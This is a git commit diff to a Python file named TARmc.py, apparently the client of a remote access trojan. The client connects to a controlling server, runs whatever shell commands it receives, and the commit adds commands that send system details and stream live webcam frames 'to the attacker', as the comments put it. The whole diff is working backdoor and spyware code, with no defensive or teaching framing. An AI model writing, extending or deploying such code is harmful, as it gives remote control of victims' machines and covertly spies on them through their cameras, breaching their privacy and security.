da5ad52dfa90328bf4109d3d7af3a60a57653cb8
Rachit Jasoria <64753500+Rachit333@users.noreply.github.com>
2023-06-12 03:04:51 +0530

    Update TARmc.py

--- TARmc.py
+++ TARmc.py
@@ -1,6 +1,9 @@
 import sys
 import socket
 import subprocess
+import cv2
+import pickle
+import struct
 
 HOST = 'localhost'
 PORT = 5555
@@ -10,13 +13,31 @@ s.connect((HOST, PORT))
 msg = s.recv(1024).decode()
 print('[*] server:', msg)
 
+# Initialize the camera
+camera = cv2.VideoCapture(0)
+
 while True:
     cmd = s.recv(1024).decode()
     print(f'[*] received: {cmd}')
     if cmd.lower() in ['q', 'quit', 'x', 'exit']:
         break
 
-    #if cmd.lower() in []
+    if cmd.lower() == 'sys':
+        # Send the system details to the attacker
+        system_info = sys.platform.encode()
+        s.send(system_info)
+        continue
+
+    if cmd.lower() == 'camera':
+        # Transmit the camera frames to the attacker
+        while True:
+            _, frame = camera.read()
+            frame_data = pickle.dumps(frame)
+            frame_size = struct.pack('!I', len(frame_data))
+            s.sendall(frame_size + frame_data)
+            if cv2.waitKey(1) == ord('q'):
+                break
+        continue
 
     try:
         result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
@@ -28,3 +49,5 @@ while True:
     s.send(result)
 
 s.close()
+camera.release()
+cv2.destroyAllWindows()
